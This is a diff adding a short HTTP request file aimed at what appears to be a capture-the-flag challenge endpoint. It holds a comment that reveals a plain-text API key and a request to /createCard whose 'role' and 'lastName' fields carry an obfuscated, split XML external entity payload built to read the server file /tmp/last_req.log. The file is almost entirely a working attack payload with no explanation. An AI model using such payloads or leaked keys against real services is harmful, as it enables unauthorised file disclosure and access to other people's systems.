@@ -1,0 +1,21 @@
+
+
+POST https://chal35-g7sg4j.vercel.app/getCRMUsers HTTP/1.1
+Content-Type: application/json
+
+{
+  "apiKey": "wrong"
+}
+
+### apiKey really is H858FDSKL49FK09K4590KFK2390KCFVC12
+
+POST https://chal35-g7sg4j.vercel.app/createCard HTTP/1.1
+Content-Type: application/json
+
+{
+  "role": "role\"> --> <ENTITY!EDOCTYPENDOCTYPETDOCTYPEIDOCTYPETDOCTYPEY role SENTITYYENTITYSENTITYTENTITYEENTITYM \"/tmp/last_req.log",
+  "firstName": "fn",
+  "lastName": "ln\"> <ENTITY!--"
+}
+
+###
